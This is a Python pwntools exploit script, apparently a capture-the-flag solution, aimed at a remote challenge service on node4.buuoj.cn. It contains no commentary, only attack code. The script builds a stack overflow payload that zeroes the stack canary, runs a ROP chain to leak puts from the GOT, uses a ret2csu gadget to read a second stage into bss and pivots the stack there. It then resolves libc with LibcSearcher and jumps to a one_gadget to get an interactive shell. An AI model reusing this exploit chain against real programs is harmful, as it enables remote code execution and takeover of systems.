from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
# io = process('./pwn')
io = remote('node4.buuoj.cn', 25587)
elf = ELF('./pwn')
poprdi = 0x400c03
poprsi_r15 = 0x400c01
leave_ret = 0x400A9B
poprbp = 0x400870
gad = 0x400BFA

io.sendlineafter(b'How many bytes do you want to send?', str(0x2000).encode())
payload = cyclic(0x28) + p64(0) + cyclic(4104 - 0x30)
payload += p64(0)	# canary
payload += p64(0)
payload += p64(poprdi)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(gad)
payload += p64(0)	# pop rbx
payload += p64(1)	# pop rbp
payload += p64(elf.got['read'])	# pop r12
payload += p64(0x100)	# pop r13
payload += p64(elf.bss() + 0x400)	# pop r14
payload += p64(0)	# pop r15
payload += p64(0x400BE0)
payload += p64(0) * 7
payload += p64(poprbp)
payload += p64(elf.bss() + 0x400)
payload += p64(leave_ret)
payload = payload.ljust(0x2000, b'\x00')

io.send(payload)
io.recvuntil(b'goodbye.\n')
puts = u64(io.recv(6) + b'\x00\x00')
libc = LibcSearcher('puts', puts)
base = puts - libc.dump('puts')
system = base + libc.dump('system')
binsh = base + libc.dump('str_bin_sh')

payload = p64(base + 0x4f322) * 4
io.sendline(payload)

io.interactive()
